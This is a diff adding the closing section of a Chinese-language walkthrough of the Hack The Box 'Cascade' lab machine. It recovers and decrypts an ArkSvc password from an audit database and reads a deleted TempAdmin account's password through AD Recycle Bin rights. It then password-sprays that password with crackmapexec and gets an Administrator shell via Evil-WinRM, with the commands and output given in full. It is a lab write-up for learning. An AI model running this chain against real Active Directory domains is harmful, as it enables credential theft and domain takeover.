@@ -415,3 +415,147 @@ getting file \RunAudit.bat of size 45 as RunAudit.bat (0.0 KiloBytes/sec) (avera
 ```
 CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
 ```
+
+打开Audit.db数据库，得到一组新凭据
+
+```
+username : ArkSvc
+pwd : BQO5l5Kj9MdErXx6Q6AGOw==
+```
+
+
+查看域用户，有这个用户名
+```
+*Evil-WinRM* PS C:\Users\s.smith\Documents> net users /domain
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+a.turnbull               administrator            arksvc
+b.hanson                 BackupSvc                CascGuest
+d.burman                 e.crowe                  i.croft
+j.allen                  j.goodhand               j.wakefield
+krbtgt                   r.thompson               s.hickson
+s.smith                  util
+The command completed with one or more errors.
+
+```
+
+看着像base64加密，但是还原以后不是可读的明文，看来还有一层加密
+
+这里我取巧了，把加密数据直接扔到搜索引擎
+
+来到[这个](https://dotnetfiddle.net/2RDoWz)网站，解密上面的密码：```w3lc0meFr31nd```
+
+
+登录这个账号
+
+```
+┌──(root💀kali)-[~/htb/Cascade]
+└─# evil-winrm -i 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'                                                   1 ⨯
+
+Evil-WinRM shell v3.2
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\arksvc\desktop> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name      SID
+============== ==============================================
+cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ===============================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+```
+
+
+
+在这里我们主要留意我们在```AD Recycle Bin```组，这个组的用户可以阅读一些已删除的AD对象信息，见[这里](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-accounts-and-token-privileges)
+
+使用命令
+```
+Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+```
+
+我们只需要用户名和密码
+```
+*Evil-WinRM* PS C:\Users\arksvc\desktop> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * |select cn,DisplayName,cascadeLegacyPwd
+
+cn                                                                              DisplayName  cascadeLegacyPwd
+--                                                                              -----------  ----------------
+Deleted Objects
+CASC-WS1...
+Scheduled Tasks...
+{A403B701-A528-4685-A816-FDEE32BDDCBA}...                                       Block Potato
+Machine...
+User...
+TempAdmin...                                                                    TempAdmin    YmFDVDNyMWFOMDBkbGVz
+
+```
+
+得到一个密码：```YmFDVDNyMWFOMDBkbGVz```
+
+base64解密以后是：```baCT3r1aN00dles```
+
+哈希喷洒这个密码
+```
+┌──(root💀kali)-[~/htb/Cascade]
+└─# crackmapexec smb 10.10.10.182  -u user.txt -p 'baCT3r1aN00dles'     
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\Administrator:baCT3r1aN00dles (Pwn3d!)
+
+```
+
+是管理员的密码
+
+拿到管理员权限
+
+```
+┌──(root💀kali)-[~/htb/Cascade]
+└─# evil-winrm -i 10.10.10.182 -u 'administrator' -p 'baCT3r1aN00dles'                                                                                                                                                                  1 ⨯
+
+Evil-WinRM shell v3.2
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+cascade\administrator
+
+```
